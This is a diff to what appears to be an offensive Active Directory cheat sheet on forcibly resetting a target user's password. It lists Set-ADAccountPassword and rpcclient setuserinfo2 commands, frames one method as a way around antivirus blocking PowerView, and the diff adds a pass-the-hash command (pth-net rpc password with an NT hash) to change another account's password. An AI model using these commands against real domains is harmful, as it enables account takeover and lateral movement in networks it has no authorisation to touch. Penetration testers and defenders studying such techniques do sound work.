@@ -29,6 +29,7 @@
      ```  
      Replace `<TARGET_USER>` (e.g., `ahmed`).  
 ---
+
 Another way to **Reset the Target User's Password** if powerview.ps1 cannot be executed (AV)
 Set-ADAccountPassword (ActiveDirectory module)
 # Example: Reset a user password to “p@ssw0rd”
@@ -39,4 +40,8 @@ Set-ADAccountPassword -Identity 'CN=Elisa Daugherty,OU=Accounts,DC=Fabrikam,DC=c
 # Using rpc from owned user login
 ```
 setuserinfo2 <target-user> 23 'P@ssword2022'
+```
+# Direct command for rpc
+```
+pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
 ```
